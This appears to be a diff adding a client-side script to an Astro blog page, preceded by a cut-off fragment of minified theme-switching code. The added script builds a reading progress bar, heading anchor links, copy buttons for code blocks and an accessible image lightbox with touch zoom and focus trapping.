t=document.querySelector(`meta[name='theme-color']`)?.getAttribute(`content`);t&&e.newDocument.querySelector(`meta[name='theme-color']`)?.setAttribute(`content`,t)}),window.matchMedia(`(prefers-color-scheme: dark)`).addEventListener(`change`,({matches:e})=>{i=e?n:t,a()});</script></body></html><script data-astro-rerun>
+  function createProgressBar() {
+    const progressContainer = document.createElement("div");
+    progressContainer.className =
+      "progress-container fixed top-0 z-10 h-1 w-full bg-background";
+
+    const progressBar = document.createElement("div");
+    progressBar.className = "progress-bar h-1 w-0 bg-accent";
+    progressBar.id = "myBar";
+
+    progressContainer.appendChild(progressBar);
+    document.body.appendChild(progressContainer);
+  }
+  createProgressBar();
+
+  function updateScrollProgress() {
+    document.addEventListener("scroll", () => {
+      const winScroll =
+        document.body.scrollTop || document.documentElement.scrollTop;
+      const height =
+        document.documentElement.scrollHeight -
+        document.documentElement.clientHeight;
+      const scrolled = (winScroll / height) * 100;
+      if (document) {
+        const myBar = document.getElementById("myBar");
+        if (myBar) {
+          myBar.style.width = scrolled + "%";
+        }
+      }
+    });
+  }
+  updateScrollProgress();
+
+  function addHeadingLinks() {
+    const headings = Array.from(
+      document.querySelectorAll("h2, h3, h4, h5, h6")
+    );
+    for (const heading of headings) {
+      heading.classList.add("group");
+      const link = document.createElement("a");
+      link.className =
+        "heading-link ms-2 no-underline opacity-75 md:opacity-0 md:group-hover:opacity-100 md:focus:opacity-100";
+      link.href = "#" + heading.id;
+
+      const span = document.createElement("span");
+      span.ariaHidden = "true";
+      span.innerText = "#";
+      link.appendChild(span);
+      heading.appendChild(link);
+    }
+  }
+  addHeadingLinks();
+
+  function attachCopyButtons() {
+    const copyButtonLabel = "Copy";
+    const codeBlocks = Array.from(document.querySelectorAll("pre"));
+
+    for (const codeBlock of codeBlocks) {
+      const wrapper = document.createElement("div");
+      wrapper.style.position = "relative";
+
+      const computedStyle = getComputedStyle(codeBlock);
+      const hasFileNameOffset =
+        computedStyle.getPropertyValue("--file-name-offset").trim() !== "";
+
+      const topClass = hasFileNameOffset
+        ? "top-(--file-name-offset)"
+        : "-top-3";
+
+      const copyButton = document.createElement("button");
+      copyButton.className = `copy-code absolute end-3 ${topClass} rounded bg-muted border border-muted px-2 py-1 text-xs leading-4 text-foreground font-medium`;
+      copyButton.innerHTML = copyButtonLabel;
+      codeBlock.setAttribute("tabindex", "0");
+      codeBlock.appendChild(copyButton);
+
+      codeBlock?.parentNode?.insertBefore(wrapper, codeBlock);
+      wrapper.appendChild(codeBlock);
+
+      copyButton.addEventListener("click", async () => {
+        await copyCode(codeBlock, copyButton);
+      });
+    }
+
+    async function copyCode(block, button) {
+      const code = block.querySelector("code");
+      const text = code?.innerText;
+
+      await navigator.clipboard.writeText(text ?? "");
+
+      button.innerText = "Copied";
+
+      setTimeout(() => {
+        button.innerText = copyButtonLabel;
+      }, 700);
+    }
+  }
+  attachCopyButtons();
+
+  /** Accessible image lightbox for article images. */
+  function initLightbox() {
+    const article = document.getElementById("article");
+    if (!article) return;
+
+    const prefersReducedMotion = () =>
+      window.matchMedia("(prefers-reduced-motion: reduce)").matches;
+
+    let overlay = null;
+    let lastFocused = null;
+
+    // Defer attribute mutations so they don't push the LCP timestamp.
+    // Event listeners below use delegation and don't need the attributes to exist yet.
+    requestAnimationFrame(() => {
+      const images = Array.from(article.querySelectorAll("img"));
+      for (const image of images) {
+        if (image.closest("a")) continue;
+        image.setAttribute("role", "button");
+        image.setAttribute("tabindex", "0");
+        image.setAttribute("aria-haspopup", "dialog");
+        image.setAttribute(
+          "aria-label",
+          image.alt ? `Zoom image: ${image.alt}` : "Zoom image"
+        );
+      }
+    });
+
+    function open(src, alt, trigger) {
+      if (overlay) return;
+      lastFocused = trigger ?? document.activeElement;
+
+      overlay = document.createElement("div");
+      overlay.setAttribute("role", "dialog");
+      overlay.setAttribute("aria-modal", "true");
+      overlay.setAttribute(
+        "aria-label",
+        alt ? `Image preview: ${alt}` : "Image preview"
+      );
+      overlay.className =
+        "fixed inset-0 z-50 flex cursor-zoom-out items-center justify-center bg-black/70 backdrop-blur-sm opacity-0 transition-opacity duration-200 motion-reduce:transition-none";
+
+      const closeButton = document.createElement("button");
+      closeButton.type = "button";
+      closeButton.setAttribute("aria-label", "Close image preview");
+      closeButton.className =
+        "absolute end-4 top-4 rounded p-2 text-3xl leading-none text-white";
+      closeButton.innerHTML = "&#10005;";
+      closeButton.addEventListener("click", close);
+
+      const image = document.createElement("img");
+      image.src = src;
+      image.alt = "";
+      image.className =
+        "max-h-[90dvh] max-w-[90dvw] cursor-default object-contain";
+
+      overlay.append(closeButton, image);
+      overlay.addEventListener("click", e => {
+        if (e.target === overlay && currentScale <= 1) close();
+      });
+
+      let currentScale = 1;
+      let translateX = 0;
+      let translateY = 0;
+      let initialDist = 0;
+      let initialScale = 1;
+      let panStartX = 0;
+      let panStartY = 0;
+      let panStartTranslateX = 0;
+      let panStartTranslateY = 0;
+      let lastTapTime = 0;
+
+      function applyTransform() {
+        image.style.transform = `scale(${currentScale}) translate(${translateX}px, ${translateY}px)`;
+      }
+
+      function resetTransform() {
+        currentScale = 1;
+        translateX = 0;
+        translateY = 0;
+        image.style.transform = "";
+      }
+
+      overlay.addEventListener(
+        "touchstart",
+        e => {
+          const t = e.touches;
+          if (t.length === 2) {
+            initialDist = Math.hypot(
+              t[1].clientX - t[0].clientX,
+              t[1].clientY - t[0].clientY
+            );
+            initialScale = currentScale;
+          } else if (t.length === 1) {
+            const now = Date.now();
+            if (now - lastTapTime < 300) {
+              e.preventDefault();
+              if (currentScale > 1) {
+                resetTransform();
+              } else {
+                currentScale = 2;
+                translateX = 0;
+                translateY = 0;
+                applyTransform();
+              }
+              lastTapTime = 0;
+              panStartX = t[0].clientX;
+              panStartY = t[0].clientY;
+              panStartTranslateX = translateX;
+              panStartTranslateY = translateY;
+            } else {
+              lastTapTime = now;
+              if (currentScale > 1) {
+                panStartX = t[0].clientX;
+                panStartY = t[0].clientY;
+                panStartTranslateX = translateX;
+                panStartTranslateY = translateY;
+              }
+            }
+          }
+        },
+        { passive: false }
+      );
+
+      overlay.addEventListener(
+        "touchmove",
+        e => {
+          const t = e.touches;
+          if (t.length === 2) {
+            e.preventDefault();
+            const dist = Math.hypot(
+              t[1].clientX - t[0].clientX,
+              t[1].clientY - t[0].clientY
+            );
+            currentScale = Math.min(
+              4,
+              Math.max(1, initialScale * (dist / initialDist))
+            );
+            applyTransform();
+          } else if (t.length === 1) {
+            if (currentScale > 1) {
+              e.preventDefault();
+              translateX =
+                panStartTranslateX + (t[0].clientX - panStartX) / currentScale;
+              translateY =
+                panStartTranslateY + (t[0].clientY - panStartY) / currentScale;
+              const maxX = Math.max(
+                0,
+                (image.clientWidth - overlay.clientWidth / currentScale) / 2
+              );
+              const maxY = Math.max(
+                0,
+                (image.clientHeight - overlay.clientHeight / currentScale) / 2
+              );
+              translateX = Math.min(maxX, Math.max(-maxX, translateX));
+              translateY = Math.min(maxY, Math.max(-maxY, translateY));
+              applyTransform();
+            } else {
+              e.preventDefault();
+            }
+          }
+        },
+        { passive: false }
+      );
+
+      overlay.addEventListener("touchend", e => {
+        if (e.touches.length === 0 && currentScale <= 1.05) {
+          resetTransform();
+        }
+      });
+
+      overlay.addEventListener("touchcancel", e => {
+        if (e.touches.length === 0 && currentScale <= 1.05) {
+          resetTransform();
+        }
+      });
+
+      document.body.appendChild(overlay);
+      document.body.style.overflow = "hidden";
+      document.addEventListener("keydown", onKeyDown);
+      window.__closeLightbox = close;
+
+      requestAnimationFrame(() => overlay?.classList.add("opacity-100"));
+      closeButton.focus();
+    }
+
+    function close() {
+      if (!overlay) return;
+      const el = overlay;
+      overlay = null;
+      window.__closeLightbox = null;
+
+      document.removeEventListener("keydown", onKeyDown);
+      document.body.style.overflow = "";
+      lastFocused?.focus();
+      lastFocused = null;
+
+      if (prefersReducedMotion()) {
+        el.remove();
+        return;
+      }
+      const remove = () => el.remove();
+      el.addEventListener("transitionend", remove, { once: true });
+      setTimeout(remove, 250); // fallback in case transitionend never fires
+      el.classList.remove("opacity-100");
+    }
+
+    function onKeyDown(e) {
+      if (e.key === "Escape") {
+        close();
+      } else if (e.key === "Tab") {
+        trapFocus(e);
+      }
+    }
+
+    // Keep keyboard focus inside the open dialog.
+    function trapFocus(e) {
+      if (!overlay) return;
+      const focusables = overlay.querySelectorAll(
+        'a[href], button, [tabindex]:not([tabindex="-1"])'
+      );
+      if (focusables.length === 0) return;
+      const first = focusables[0];
+      const last = focusables[focusables.length - 1];
+      if (e.shiftKey && document.activeElement === first) {
+        e.preventDefault();
+        last.focus();
+      } else if (!e.shiftKey && document.activeElement === last) {
+        e.preventDefault();
+        first.focus();
+      }
+    }
+
+    function triggerFromEvent(e) {
+      const image = e.target.closest("img");
+      if (!image || !article.contains(image) || image.closest("a")) return null;
+      return image;
+    }
+
+    function activate(image) {
+      open(image.currentSrc || image.src, image.alt, image);
+    }
+
+    article.addEventListener("click", e => {
+      const image = triggerFromEvent(e);
+      if (!image) return;
+      e.preventDefault();
+      activate(image);
+    });
+
+    article.addEventListener("keydown", e => {
+      if (e.key !== "Enter" && e.key !== " " && e.key !== "Spacebar") return;
+      const image = triggerFromEvent(e);
+      if (!image) return;
+      e.preventDefault();
+      activate(image);
+    });
+  }
+  initLightbox();
+
+  if (!window.__lightboxSwapBound) {
+    window.__lightboxSwapBound = true;
+    document.addEventListener("astro:before-swap", () =>
+      window.__closeLightbox?.()
+    );
+  }
+
+  document.addEventListener("astro:after-swap", () =>
+    window.scrollTo({ left: 0, top: 0, behavior: "instant" })
+  );
+</script>
